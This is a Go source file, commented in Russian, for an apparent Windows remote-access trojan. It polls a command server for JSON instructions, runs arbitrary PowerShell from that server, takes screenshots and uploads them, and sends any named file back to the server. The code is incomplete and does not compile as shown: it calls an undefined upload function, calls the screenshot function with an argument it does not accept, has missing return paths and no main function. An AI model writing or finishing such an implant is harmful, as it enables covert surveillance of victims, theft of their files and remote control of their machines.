package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"time"

	"github.com/go-vgo/robotgo"
)

// Command представляет команду, полученную с сервера.
type Command struct {
	Name    string `json:"name"`
	Action  string `json:"action"`
	Details string `json:"details"`
}

func command_execution(command string) (string, error) {

	// Обертка команды для использования в PowerShell
	cmd := exec.Command("powershell", "-Command", command)

	// Выполнение команды
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}

	return string(output), nil
}
func captureScreen() (string, error) {
	// Получаем размеры экрана
	width, height := robotgo.GetScreenSize()
	// Создаем скриншот всего экрана
	bitmap := robotgo.CaptureScreen(0, 0, width, height)
	screen := robotgo.ToImage(bitmap)

	defer robotgo.FreeBitmap(bitmap)
	currentTime := time.Now()

	// Форматирование времени в виде строки
	timeString := currentTime.Format("2006-01-02 15:04:05")
	filename := "screen_" + timeString + ".png"
	// Сохраняем скриншот в файл
	err := robotgo.Save(screen, filename)
	if err != nil {
		return "", fmt.Errorf("не удалось сохранить скриншот: %v", err)
	}
	return filename, nil
}

// FetchCommands отправляет запрос на сервер и получает список команд.
func FetchCommands(serverURL string) ([]Command, error) {
	// Отправка GET-запроса на сервер
	resp, err := http.Get(serverURL)
	if err != nil {
		return nil, fmt.Errorf("ошибка при отправке запроса на сервер: %w", err)
	}
	defer resp.Body.Close()

	// Проверка статуса HTTP-ответа
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("сервер вернул ошибку: статус %v", resp.Status)
	}

	// Чтение тела ответа
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("ошибка при чтении ответа: %w", err)
	}

	// Десериализация JSON в список команд
	var commands []Command
	if err := json.Unmarshal(body, &commands); err != nil {
		return nil, fmt.Errorf("ошибка при десериализации списка команд: %w", err)
	}

	return commands, nil
}

func CommandsExec(command Command, serverURL string) (string, error) {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		panic(err)
	}
	if command.Name == "PS_command" {
		output, err := command_execution(command.Details)
		return output, err
	} else if command.Name == "Make_Screenshot" {
		captureScreen(homeDir + "\\AppData\\Local\\Temp")
		UploadFile(homeDir+"\\AppData\\Local\\Temp\\screen.png", serverURL)
	} else if command.Name == "Download_file" {
		UploadFile(command.Details, serverURL)
	}
}
